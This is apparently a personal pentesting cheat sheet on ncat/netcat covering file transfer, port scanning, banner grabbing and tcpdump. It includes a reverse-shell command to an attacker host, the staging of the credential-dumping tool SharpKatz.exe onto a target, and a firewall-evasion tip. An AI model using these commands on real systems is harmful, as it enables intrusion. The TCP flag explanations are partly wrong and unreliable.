---
id: netcat
aliases:
  - netcat
  - ncat
  - nc
tags:
  - Networking/Tools/Netcat
links: "[[Netcat]]"
---

# Netcat

`ncat` — Reimplementation of netcat maintained by the [Nmap](https://nmap.org/ncat/) team

<!-- Info {{{-->
> [!info]-
>
> - [Ncat](https://nmap.org/ncat/)
> - [Ncat Users' Guide](https://nmap.org/ncat/guide/index.html)
> - [ncat - man7.org](https://www.man7.org/linux/man-pages/man1/ncat.1.html)
> - [Netcat - Wikipedia](https://en.wikipedia.org/wiki/Netcat)
>
<!-- }}} -->

___


<!-- Install {{{-->
## Install

**Linux**

```sh
sudo apt install nmap
```

**Windows**

Windows binary version - [Ncat 5.59BETA1](https://nmap.org/dist/ncat-portable-5.59BETA1.zip)

___
<!-- }}} -->

<!-- Usage {{{-->
## Usage

Synopsis

```sh
ncat [OPTIONS...] [hostname] [port]
```

<!-- Examples {{{-->
> [!example]-
>
> **Examples**
>
>```sh
># Execute the given command after connecting
>ncat -e /bin/bash localhost 8080
>
># Listen for incoming connections
>ncat -l 8080
>
># Do not resolve hostnames via DNS
>ncat -n localhost 8080
>
># Specify source port to use
>ncat -p 8080 localhost 8081
>
># Use source IP address
>ncat -s 192.168.1.5 localhost 8080
>
># Answer TELNET negotiation
>ncat -t localhost 8080
>
># Use UDP instead of default TCP
>ncat -u localhost 8080
>
># Verbose mode
>ncat -v localhost 8080
>
># Set a timeout for idle connection
>ncat -w 5 localhost 8080
>
># Zero-I/O mode, report connection status only
>ncat -z localhost 8080
>
># Banner grabbing
>nc -nv {target_ip} 21
>```
<!-- }}} -->

<!-- File Transfer {{{-->
### File Transfer

Transfer files from the attacker to the target

**METHOD 1**

Send a file from the attacker macine to the target machine

```mermaid
flowchart LR
   Attacker -- File --> Target
```

<!-- Warning {{{-->
> [!warning]
>
> Ingress connections may be blocked by firewalls
>
<!-- }}} -->

1. **Target**: Listen to the incoming connection

[Ncat](https://nmap.org/ncat/)

```sh
ncat -l -p 8000 --recv-only > SharpKatz.exe
```
<!-- Info {{{-->
> [!info]-
>
> - `-recv-only`: Close the connection once the file transfer is finished
>
<!-- }}} -->

[nc](https://en.wikipedia.org/wiki/Netcat)

```sh
nc -l -p 8000 > <out_file>
```

2. **Attacker**: Send a file to the target

[Ncat](https://nmap.org/ncat/)

```sh
ncat --send-only $target 8000 < <file>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
> ```
>
<!-- }}} -->

[nc](https://en.wikipedia.org/wiki/Netcat)

```sh
nc -q 0 $target 8000 < <file>
```

<!-- Info {{{-->
> [!info]-
>
> - `-q 0`: Close the connection after EOF on stdin
>
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> ```sh
> nc -q 0 192.168.49.128 8000 < SharpKatz.exe
> ```
<!-- }}} -->

**METHOD 2**

Connect to the attacker machine to retrieve a file to the target

```mermaid
flowchart LR
   B[Target] -- Connection --> A[Attacker] -- File --> B
```

1. **Attacker** - Listen to incoming connection and serve a file

[Ncat](https://nmap.org/ncat/)

```sh
sudo ncat -l -p 443 --send-only < <file>
```

[nc](https://en.wikipedia.org/wiki/Netcat)

```sh
sudo nc -l -p 443 -q 0 < <file>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> sudo nc -l -p 443 -q 0 < SharpKatz.exe
> ```
>
<!-- }}} -->

2. **Target** - Connect to the attacker to receive a file

[Ncat](https://nmap.org/ncat/)


```sh
ncat <attacker_ip> 443 --recv-only > <out_file>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
> ```
<!-- }}} -->

[nc](https://en.wikipedia.org/wiki/Netcat)

```sh
nc <attacker_ip> 443 > <out_file>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> nc 192.168.49.128 443 > SharpKatz.exe
> ```
<!-- }}} -->


<!-- }}} -->

<!-- Port Scanning {{{-->
### Port Scanning

Check if the port is open and then close the connection *(ports 80-90 through
`localhost`)*

```sh
ncat -v -n -z localhost 80-90
```
<!-- }}} -->

<!-- Reverse Shell {{{-->
### Reverse Shell

Open a listener and listen to an incoming connection

1. Open a netcat listener

```sh
ncat -lvnp <listening_port> [-ssl]
```

> [!example]-
>
> ```sh
> nc -lvnp 1234
> ```

> [!tip]-
>
> Keep the listening port below `1000` to avoid firewall detection

2. Initiate a connection from the victim's machine back to the attacker's machine

```sh
ncat <attacker_ip> <attacker_port> -e /bin/bash
```
<!-- }}} -->

<!-- Service Banner {{{-->
### Service Banner

[[Netcat]] - Grab the banner of a service

```sh
ncat -nv $target <port>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> nc -nv 10.129.2.28 25
> ```
> ```sh
> Connection to 10.129.2.28 port 25 [tcp/*] succeeded!
> 220 inlane ESMTP Postfix (Ubuntu)
> ```
>
<!-- }}} -->

[Tcpdump](https://en.wikipedia.org/wiki/Tcpdump) —
Intercept the network traffic

1. Start `tcpdump` between the attacker and the target machine

```sh
sudo tcpdump -i <network_interface> host <attacker_ip> and <target_ip>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> sudo tcpdump -i eth0 host 10.10.14.2 and 10.129.2.28
> ```
> ```sh
> tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
> listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
> ```
<!-- }}} -->

2. Grab the banner of a service

```sh
ncat -nv $target <port>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> ncat -nv 10.129.2.28 25
> ```
> ```sh
> Connection to 10.129.2.28 port 25 [tcp/*] succeeded!
> 220 inlane ESMTP Postfix (Ubuntu)
> ```
<!-- }}} -->

3. Inspect intercepted `Tcpdump` traffic

<!-- Example {{{-->
> [!example]-
>
> ```sh
> 18:28:07.128564 IP 10.10.14.2.59618 > 10.129.2.28.smtp: Flags [S], seq 1798872233, win 65535, options [mss 1460,nop,wscale 6,nop,nop,TS val 331260178 ecr 0,sackOK,eol], length 0
> 18:28:07.255151 IP 10.129.2.28.smtp > 10.10.14.2.59618: Flags [S.], seq 1130574379, ack 1798872234, win 65160, options [mss 1460,sackOK,TS val 1800383922 ecr 331260178,nop,wscale 7], length 0
> 18:28:07.255281 IP 10.10.14.2.59618 > 10.129.2.28.smtp: Flags [.], ack 1, win 2058, options [nop,nop,TS val 331260304 ecr 1800383922], length 0
> 18:28:07.319306 IP 10.129.2.28.smtp > 10.10.14.2.59618: Flags [P.], seq 1:36, ack 1, win 510, options [nop,nop,TS val 1800383985 ecr 331260304], length 35: SMTP: 220 inlane ESMTP Postfix (Ubuntu)
> 18:28:07.319426 IP 10.10.14.2.59618 > 10.129.2.28.smtp: Flags [.], ack 36, win 2058, options [nop,nop,TS val 331260368 ecr 1800383985], length 0
> ```
>
> > [!info]
> >
> > - The first three packets is the three-way handshake
> > - Then, the target [[SMTP/General|SMTP]] server sends a TCP packet
> >   with the `PSH` and `ACK` flags:
> >   - `PSH` states that the target server is sending data to the target
> >   - `ACK` states that all required data has been sent
> > - The last packet (`ACK`) confirms the receipt of the data
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->
